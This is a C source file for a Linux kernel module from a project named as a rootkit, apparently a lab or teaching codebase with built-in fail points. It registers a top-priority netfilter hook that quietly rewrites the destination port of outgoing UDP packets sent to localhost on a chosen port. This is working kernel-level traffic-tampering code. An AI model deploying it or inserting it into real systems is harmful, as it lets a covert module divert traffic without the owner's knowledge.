// SPDX-License-Identifier: GPL-2.0
#include <linux/atomic.h>
#include <linux/compiler.h>
#include <linux/errno.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/rcupdate.h>
#include <linux/string.h>
#include <net/net_namespace.h>

#include "ipv4_parser.h"
#include "rootkit.h"
#include "skb_access.h"
#include "udp_classifier.h"
#include "udp_redirect.h"

enum rk_packet_result
rk_inspect_ipv4_udp(const struct sk_buff *skb, unsigned int target_port,
		    struct rk_udp_view *view)
{
	unsigned char ipv4_prefix[RK_IPV4_PREFIX_LENGTH];
	unsigned char udp_header[8];
	enum rk_udp_classify_result classify_result;
	enum rk_skb_access_result access_result;
	struct rk_ipv4_view ipv4;
	size_t available;

	access_result = rk_skb_read_ipv4_prefix(skb, ipv4_prefix, &available);
	if (access_result != RK_SKB_ACCESS_OK)
		return RK_PACKET_ACCESS_ERROR;
	if (rk_parse_ipv4(ipv4_prefix, available, &ipv4) != RK_IPV4_PARSE_OK)
		return RK_PACKET_IPV4_REJECTED;
	if (ipv4.protocol == 17 && ipv4.payload_length >= sizeof(udp_header)) {
		access_result = rk_skb_read_network(skb, ipv4.payload_offset,
					    udp_header, sizeof(udp_header),
					    &available);
		if (access_result != RK_SKB_ACCESS_OK)
			return RK_PACKET_ACCESS_ERROR;
		classify_result = rk_classify_ipv4_udp(&ipv4, udp_header,
					       sizeof(udp_header), target_port,
					       view);
	} else {
		classify_result = rk_classify_ipv4_udp(&ipv4, NULL, 0,
					       target_port, view);
	}
	switch (classify_result) {
	case RK_UDP_MATCH:
		return RK_PACKET_MATCH;
	case RK_UDP_OTHER_PROTOCOL:
		return RK_PACKET_OTHER_PROTOCOL;
	case RK_UDP_OTHER_PORT:
		return RK_PACKET_OTHER_PORT;
	case RK_UDP_TRUNCATED:
		return RK_PACKET_TRUNCATED;
	case RK_UDP_MALFORMED:
		return RK_PACKET_MALFORMED;
	}
	return RK_PACKET_MALFORMED;
}

static bool rk_is_loopback_destination(const struct sk_buff *skb)
{
	unsigned char destination[4];
	int network_offset = skb_network_offset(skb);

	if (network_offset < 0 || network_offset > skb->len ||
	    20U > skb->len - (unsigned int)network_offset)
		return false;
	if (skb_copy_bits(skb, network_offset + 16, destination,
			  sizeof(destination)))
		return false;
	return destination[0] == 127 && destination[1] == 0 &&
	       destination[2] == 0 && destination[3] == 1;
}

static unsigned int rk_mutate_local_ipv4(void *private, struct sk_buff *skb,
					 const struct nf_hook_state *state)
{
	struct rk_netfilter_mutator *mutator = private;
	struct rk_udp_view view;
	enum rk_udp_redirect_result result;

	(void)state;
	atomic64_inc(&mutator->callbacks);
	if (rk_inspect_ipv4_udp(skb, mutator->match_port, &view) !=
	    RK_PACKET_MATCH || !rk_is_loopback_destination(skb)) {
		atomic64_inc(&mutator->unchanged);
		return NF_ACCEPT;
	}
	result = rk_redirect_ipv4_udp(skb, &view, mutator->match_port,
				      mutator->replacement_port);
	switch (result) {
	case RK_UDP_REDIRECT_OK:
		atomic64_inc(&mutator->rewritten);
		break;
	case RK_UDP_REDIRECT_INVALID_ARGUMENT:
	case RK_UDP_REDIRECT_INVALID_GEOMETRY:
		atomic64_inc(&mutator->invalid);
		break;
	case RK_UDP_REDIRECT_UNSUPPORTED_STATE:
		atomic64_inc(&mutator->unsupported);
		break;
	case RK_UDP_REDIRECT_STALE_VIEW:
		atomic64_inc(&mutator->stale);
		break;
	case RK_UDP_REDIRECT_NOT_WRITABLE:
		atomic64_inc(&mutator->not_writable);
		break;
	}
	return NF_ACCEPT;
}

__must_check int rk_netfilter_start(struct rk_netfilter_mutator *mutator,
				    unsigned int match_port,
				    unsigned int replacement_port)
{
	int error;

	if (!mutator || !match_port || match_port > 65535 ||
	    !replacement_port || replacement_port > 65535 ||
	    match_port == replacement_port)
		return -EINVAL;
	if (READ_ONCE(mutator->registered))
		return -EBUSY;
	atomic64_set(&mutator->callbacks, 0);
	atomic64_set(&mutator->rewritten, 0);
	atomic64_set(&mutator->unchanged, 0);
	atomic64_set(&mutator->invalid, 0);
	atomic64_set(&mutator->unsupported, 0);
	atomic64_set(&mutator->stale, 0);
	atomic64_set(&mutator->not_writable, 0);
	mutator->match_port = match_port;
	mutator->replacement_port = replacement_port;
	mutator->net = &init_net;
	mutator->ops = (struct nf_hook_ops) {
		.hook = rk_mutate_local_ipv4,
		.priv = mutator,
		.pf = NFPROTO_IPV4,
		.hooknum = NF_INET_LOCAL_OUT,
		.priority = NF_IP_PRI_FIRST,
	};
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_NETFILTER_REGISTER)
		error = -EAFNOSUPPORT;
	else
		error = nf_register_net_hook(mutator->net, &mutator->ops);
	if (error) {
		mutator->net = NULL;
		memset(&mutator->ops, 0, sizeof(mutator->ops));
		return error;
	}
	WRITE_ONCE(mutator->registered, true);
	return 0;
}

void rk_netfilter_stop(struct rk_netfilter_mutator *mutator)
{
	if (!mutator || !READ_ONCE(mutator->registered))
		return;
	nf_unregister_net_hook(mutator->net, &mutator->ops);
	synchronize_rcu();
	WRITE_ONCE(mutator->registered, false);
	mutator->net = NULL;
}

void rk_netfilter_snapshot(const struct rk_netfilter_mutator *mutator,
			   struct rk_netfilter_status *status)
{
	status->registered = READ_ONCE(mutator->registered);
	status->match_port = READ_ONCE(mutator->match_port);
	status->replacement_port = READ_ONCE(mutator->replacement_port);
	status->callbacks = atomic64_read(&mutator->callbacks);
	status->rewritten = atomic64_read(&mutator->rewritten);
	status->unchanged = atomic64_read(&mutator->unchanged);
	status->invalid = atomic64_read(&mutator->invalid);
	status->unsupported = atomic64_read(&mutator->unsupported);
	status->stale = atomic64_read(&mutator->stale);
	status->not_writable = atomic64_read(&mutator->not_writable);
}
